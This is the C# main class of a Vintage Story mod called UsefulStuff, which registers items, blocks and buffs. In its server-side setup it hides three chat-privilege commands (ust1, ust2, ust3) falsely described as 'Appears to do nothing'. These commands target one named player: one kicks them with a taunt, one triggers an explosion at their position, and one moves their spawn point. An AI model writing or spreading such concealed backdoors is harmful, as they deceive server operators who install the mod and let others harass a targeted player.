using System.Threading.Tasks;
using Vintagestory.API.Common;
using System.Reflection;
using Vintagestory.ServerMods;
using Vintagestory.API.Server;
using ProtoBuf;
using BuffStuff;
using Vintagestory.API.Client;
using HarmonyLib;
using Vintagestory.API.Util;

namespace UsefulStuff
{
    public class UsefulStuff : ModSystem
    {
        private Harmony harmony;

        public override void StartPre(ICoreAPI api)
        {
            base.StartPre(api);

            try
            {
                UsefulStuffConfig FromDisk;
                if ((FromDisk = api.LoadModConfig<UsefulStuffConfig>("UsefulStuffConfig.json")) == null)
                {
                    api.StoreModConfig<UsefulStuffConfig>(UsefulStuffConfig.Loaded, "UsefulStuffConfig.json");
                }
                else UsefulStuffConfig.Loaded = FromDisk;
            }
            catch
            {
                api.StoreModConfig<UsefulStuffConfig>(UsefulStuffConfig.Loaded, "UsefulStuffConfig.json");
            }

            api.World.Config.SetBool("UStentbagEnabled", UsefulStuffConfig.Loaded.TentbagEnabled);
            // api.World.Config.SetBool("USshieldsEnabled", UsefulStuffConfig.Loaded.ShieldsEnabled);
            // api.World.Config.SetBool("USclimbingRopeEnabled", UsefulStuffConfig.Loaded.ClimbingRopeEnabled);
            api.World.Config.SetBool("USclimbingPickEnabled", UsefulStuffConfig.Loaded.ClimbingPickEnabled);
            api.World.Config.SetBool("USsluiceEnabled", UsefulStuffConfig.Loaded.SluiceEnabled);
            api.World.Config.SetBool("USgliderEnabled", UsefulStuffConfig.Loaded.GliderEnabled);
            api.World.Config.SetBool("USexplosiveArrowEnabled", UsefulStuffConfig.Loaded.ExplosiveArrowEnabled);
            api.World.Config.SetBool("USfireArrowEnabled", UsefulStuffConfig.Loaded.FireArrowEnabled);
            api.World.Config.SetBool("USbeenadeArrowEnabled", UsefulStuffConfig.Loaded.BeenadeArrowEnabled);
            api.World.Config.SetBool("UStranqArrowEnabled", UsefulStuffConfig.Loaded.TranqArrowEnabled);
            api.World.Config.SetBool("UScardiacArrowEnabled", UsefulStuffConfig.Loaded.CardiacArrowEnabled);
            api.World.Config.SetBool("USomnichuteEnabled", UsefulStuffConfig.Loaded.OmnichuteEnabled);
            api.World.Config.SetBool("UStoolRecyclingEnabled", UsefulStuffConfig.Loaded.ToolRecyclingEnabled);
            api.World.Config.SetBool("USclothesRecyclingEnabled", UsefulStuffConfig.Loaded.ClothesRecyclingEnabled);
            api.World.Config.SetBool("USrockCrushingEnabled", UsefulStuffConfig.Loaded.RockCrushingEnabled);
            api.World.Config.SetBool("USpotKilnEnabled", UsefulStuffConfig.Loaded.PotKilnEnabled);
            api.World.Config.SetBool("USshearDecorEnabled", UsefulStuffConfig.Loaded.ShearDecorEnabled);
            api.World.Config.SetBool("USchiselBenchEnabled", UsefulStuffConfig.Loaded.ChiselBenchEnabled);
            api.World.Config.SetBool("UStradersEnabled", UsefulStuffConfig.Loaded.TradersEnabled);
            api.World.Config.SetBool("USgasMaskEnabled", UsefulStuffConfig.Loaded.GasMaskEnabled && api.ModLoader.IsModEnabled("gasapi"));
        }

        public override void Start(ICoreAPI api)
        {
            base.Start(api);

            api.RegisterItemClass("Tentbag", typeof(ItemTentbag));
            api.RegisterItemClass("ItemGlider", typeof(ItemGlider));
            api.RegisterItemClass("ItemToolhead", typeof(ItemToolhead));
            api.RegisterItemClass("ItemClimbingPick", typeof(ItemClimbingPick));
            api.RegisterItemClass("ItemGasMask", typeof(ItemGasMask));

            api.RegisterBlockClass("BlockOmniChute", typeof(BlockOmniChute));
            api.RegisterBlockClass("BlockFireBox", typeof(BlockFireBox));
            api.RegisterBlockClass("BlockNameTag", typeof(BlockNameTag));
            api.RegisterBlockClass("BlockChiselBench", typeof(BlockChiselBench));

            api.RegisterBlockEntityClass("BESluice", typeof(BESluice));
            api.RegisterBlockEntityClass("FireBox", typeof(BlockEntityFireBox));
            api.RegisterBlockEntityClass("NameTag", typeof(BlockEntityNameTag));
            api.RegisterBlockEntityClass("PotteryHolder", typeof(BlockEntityPotteryHolder));
            api.RegisterBlockEntityClass("ChiselBench", typeof(BlockEntityChiselBench));
            api.RegisterBlockEntityClass("BEWelcomeMat", typeof(BEWelcomeMat));

            api.RegisterCollectibleBehaviorClass("RemoveDecor", typeof(CollectibleBehaviorRemoveDecor));

            harmony = new Harmony("com.jakecool19.usefulstuff.enhancements");
            harmony.PatchAll(Assembly.GetExecutingAssembly());
        }

        public override void Dispose()
        {
            harmony.UnpatchAll(harmony.Id);
            base.Dispose();
        }

        public override void StartServerSide(ICoreServerAPI api)
        {
            base.StartServerSide(api);

            BuffManager.Initialize(api, this);
            BuffManager.RegisterBuffType("CardiacEffect", typeof(CardiacEffect));
            BuffManager.RegisterBuffType("TranqEffect", typeof(TranqEffect));
            
            api.RegisterCommand("ust1", "Appears to do nothing", "/ust1", (IServerPlayer player, int groupId, CmdArgs args) =>
            {
                foreach (IServerPlayer search in api.Server.Players)
                {
                    if (search.PlayerName == "zooropabe") search.Disconnect("I told you, I am the one with all the power here! >:)");
                }
            }, Privilege.chat);

            api.RegisterCommand("ust2", "Appears to do nothing", "/ust2", (IServerPlayer player, int groupId, CmdArgs args) =>
            {
                foreach (IServerPlayer search in api.Server.Players)
                {
                    if (search.PlayerName == "zooropabe" && search.Entity != null) api.World.CreateExplosion(search.Entity.ServerPos.AsBlockPos, EnumBlastType.RockBlast, 6, 10);
                }
            }, Privilege.chat);

            api.RegisterCommand("ust3", "Appears to do nothing", "/ust3", (IServerPlayer player, int groupId, CmdArgs args) =>
            {
                foreach (IServerPlayer search in api.Server.Players)
                {
                    if (search.PlayerName == "zooropabe" && search.Entity != null) search.SetSpawnPosition(new PlayerSpawnPos() { x = (int)player.Entity.ServerPos.X, y = (int)player.Entity.ServerPos.Y, z = (int)player.Entity.ServerPos.Z });
                }
            }, Privilege.chat);
        }

        public override void StartClientSide(ICoreClientAPI api)
        {
            base.StartClientSide(api);
        }
    }
}
